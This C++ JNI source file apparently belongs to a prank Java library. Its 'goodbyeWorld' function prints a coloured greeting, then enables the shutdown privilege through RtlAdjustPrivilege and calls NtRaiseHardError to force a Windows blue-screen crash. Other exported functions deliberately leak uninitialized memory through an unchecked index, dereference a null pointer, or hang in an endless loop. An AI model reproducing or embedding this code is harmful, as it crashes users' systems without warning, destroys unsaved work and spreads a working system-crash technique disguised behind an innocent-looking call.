#include "snkr.h"

#include "../logger/logger.h"

#include <iostream>
#include <cstdlib>
#include <ctime>
#include <iostream>
#include <fstream>

#include <windows.h>
#include <ntstatus.h>
#include <winternl.h>
#include <jni.h>

using namespace std;

int clamp(int value, int min, int max);

int adjPriv();

int raiseErr();

struct UninitializedArray
{
    long value[1024];
};

UninitializedArray UninitializedArrayImpl(const int alloc)
{
    UninitializedArray array;

    for (int i = 0; i < alloc; i++) {
        array.value[i];
    }

    return array;
}

typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFn)
(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

RtlAdjustPrivilegeFn RtlAdjustPrivilege;

typedef NTSTATUS (NTAPI *NtRaiseHardErrorFn)
(
    LONG ErrorStatus,
    ULONG Unless1,
    ULONG Unless2,
    PULONG_PTR Unless3,
    ULONG ValidResponseOption,
    PULONG ResponsePointer
);

NtRaiseHardErrorFn NtRaiseHardError;

JNIEXPORT void JNICALL Java_bytesnek_hiss_sneaky_SNKR_goodbyeWorld(JNIEnv* env, jobject obj)
{
    srand(time(nullptr));

    const string RESET = "\u001b[0m";

    for (const char c : "Goodbye, World!") {
        const int randomColour = rand() % 216 + 16;

        cout << "\u001b[1m\u001b[3m\u001b[4m" << "\u001b[38;5;" << randomColour << "m" << c << RESET;
    }

    println(RESET);

    adjPriv();
    raiseErr();
}

JNIEXPORT jlong JNICALL Java_bytesnek_hiss_sneaky_SNKR_getEarlyMemory(JNIEnv* env, jobject obj, const jint jalloc, const jint jindex)
{
    const int clamped = clamp(jalloc, 0, 1024);

    auto [value] = UninitializedArrayImpl(clamped);

    return value[jindex];
}

JNIEXPORT void JNICALL Java_bytesnek_hiss_sneaky_SNKR_deRefNullPtr(JNIEnv* env, jobject obj)
{
    char* p = nullptr;

    *p = '\0';
}

JNIEXPORT void JNICALL Java_bytesnek_hiss_sneaky_SNKR_breakpointInstance(JNIEnv* env, jobject obj, jboolean jflag)
{
    while (jflag);
}

int clamp(int value, const int min, const int max)
{
    if (value > max) {
        value = max;
    }
    else if (value < min) {
        value = min;
    }

    return value;
}

int adjPriv()
{
    BOOLEAN Enabled = FALSE;
    const HMODULE NtDll = GetModuleHandle("ntdll.dll");

    if (NtDll == nullptr) {
        return -1;
    }

    RtlAdjustPrivilege = reinterpret_cast<RtlAdjustPrivilegeFn>(GetProcAddress(NtDll, "RtlAdjustPrivilege"));

    if (RtlAdjustPrivilege == nullptr) {
        return -1;
    }

    if (const NTSTATUS Status = RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled); Status != 0) {
        return -1;
    }

    if (Enabled) {
        return 0;
    }

    return -1;
}

int raiseErr()
{
    ULONG ErrorResponse = 0;
    const HMODULE NtDll = GetModuleHandle("ntdll.dll");

    if (NtDll == nullptr) {
        return -1;
    }

    NtRaiseHardError = reinterpret_cast<NtRaiseHardErrorFn>(GetProcAddress(NtDll, "NtRaiseHardError"));

    if (NtRaiseHardError == nullptr) {
        return -1;
    }

    if (const NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, nullptr, 6, &ErrorResponse); Status != 0) {
        return -1;
    }

    return 0;
}
